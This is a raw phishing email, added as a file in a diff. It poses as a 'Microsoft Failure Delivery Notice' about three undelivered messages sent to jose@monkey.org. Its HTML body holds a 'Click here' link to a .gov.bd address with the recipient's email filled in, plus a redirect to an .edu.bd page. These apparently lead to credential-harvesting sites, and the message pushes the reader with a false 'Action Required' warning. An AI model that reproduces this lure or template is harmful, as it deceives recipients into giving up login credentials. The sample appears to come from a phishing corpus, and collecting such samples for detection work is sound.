@@ -1,0 +1,171 @@
+Return-Path: MAILER-DAEMON
+Delivered-To: jose@monkey.org
+X-FDA: 79025034942.24.9ABBFA9
+Received: from out.smarshmail.com (out.smarshmail.com [199.193.206.151])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id EC77110627451
+	for <jose@monkey.org>; Thu, 13 Jan 2022 11:26:10 +0000 (UTC)
+Received: from chc.tqfdehd2iccepi0sf1x2bncwsc.ex.internal.cloudapp.net
+ (20.98.22.69) by MBX125-W8-CO-2.exch125.serverpod.net (10.224.13.214) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P521) id 15.1.2375.17; Thu, 13
+ Jan 2022 03:26:09 -0800
+Content-Type: multipart/alternative; boundary="===============1427287957=="
+MIME-Version: 1.0
+Subject: Mail delivery failed: returning message to sender - jose@monkey.org
+To: <jose@monkey.org>
+From: Mail Delivery System
+Date: Thu, 13 Jan 2022 11:26:09 +0000
+Message-ID:
+	<ca9bb167-8f8c-4b30-9f6d-f6402705ee12@MBX125-W8-CO-2.exch125.serverpod.net>
+X-Originating-IP: [20.98.22.69]
+X-ClientProxiedBy: MBX125-W1-CO-5.exch125.serverpod.net (10.224.13.136) To
+ MBX125-W8-CO-2.exch125.serverpod.net (10.224.13.214)
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: EC77110627451
+X-Stat-Signature: xg347otw5mob38b61usc9rngs45ase5o
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf14.b.hostedemail.com: domain of out.smarshmail.com has no SPF policy when checking 199.193.206.151) smtp.helo=out.smarshmail.com
+X-Spam-Status: No, score=3.20
+X-HE-Tag: 1642073170-165005
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 4
+
+--===============1427287957==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Microsoft Failure Delivery Notice.
+  User: jose@monkey.org =
+
+ (3) pending sent messages couldn't be delivered =
+
+ =
+
+ * Action Required.    =
+
+* How to Fix It. =
+
+Click here to view undelivered sent email. =
+
+ Created Date: 01. 13. 2021 =
+
+ =
+
+ =
+
+ The information contained in or attached to this communication is intended=
+ solely for the use of the individual or entity to whom it is addressed and=
+ others authorised to receive it. It may contain confidential or legally pr=
+ivileged information. If you are not the intended recipient you are hereby =
+notified that any disclosure, copying, distribution or taking any action in=
+ reliance on the contents of this information is strictly prohibited and ma=
+y be unlawful. If you have received this communication in error, please not=
+ify me immediately by responding to this email and then delete it from your=
+ system. We are neither liable for the proper and complete transmission of =
+the information contained in this communication nor for any delay in its re=
+ceipt.    =20
+--===============1427287957==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><P style=3D"FONT-SIZE: small; FONT-FAMILY: Ari=
+al, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRA=
+NSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; O=
+RPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
+0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial"><STRONG>Microsoft Failure Delivery Notice.</S=
+TRONG></P>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px">User:&nbsp;<STRONG>jose@monkey.org</STRONG></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px"><BR></DIV>
+<P style=3D"COLOR: rgb(32,31,30)">(3) pending sent messages couldn't be del=
+ivered&nbsp;</P>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px"><BR></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px">* Action Required.&nbsp; &nbsp;&nbsp;<BR>* How to=
+ Fix It.
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
+px"><BR><STRONG><SPAN style=3D"COLOR: rgb(0,0,255)"><A style=3D"COLOR: rgb(=
+17,85,204)" href=3D"https://phghs.gov.bd/%3C%3E/NewestUpdate/?email=3Djose@=
+monkey.org" target=3D_blank data-saferedirecturl=3D"https://www.google.com/=
+url?q=3Dhttps://aca.edu.bd/undelivered/NewestUpdate/?email%3D25&amp;source=
+=3Dgmail&amp;ust=3D1642023456720000&amp;usg=3DAOvVaw3getFRX6keSwrKeOG1sv-V"=
+>Click here</A></SPAN>&nbsp;</STRONG>to view undelivered sent email.</DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
+px"><BR></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
+px"><SPAN>Created</SPAN>&nbsp;Date: 01. 13. 2021</DIV></DIV></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l"><BR></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l"><BR></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l"><BR></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l"><SPAN style=3D"LINE-HEIGHT: 18px"><FONT size=3D1><FONT color=3D#999999>T=
+he information contained in or attached to this communication is intended s=
+olely for the use of the individual or entity to whom it is addressed and o=
+thers authorised to receive it. It may contain confidential or legally priv=
+ileged information. If you are not the intended recipient you are hereby no=
+tified that any disclosure, copying, distribution or taking any action in r=
+eliance on the contents of this information is strictly prohibited and may =
+be unlawful. If you have received this communication in error, please notif=
+y me immediately by responding to this email and then delete it from your s=
+ystem. We are neither liable for the proper and complete transmission of th=
+e information contained in this communication nor for any delay in its rece=
+ipt.&nbsp;</FONT>&nbsp; &nbsp;&nbsp;</FONT></SPAN></DIV></BODY></HTML>
+--===============1427287957==--
+
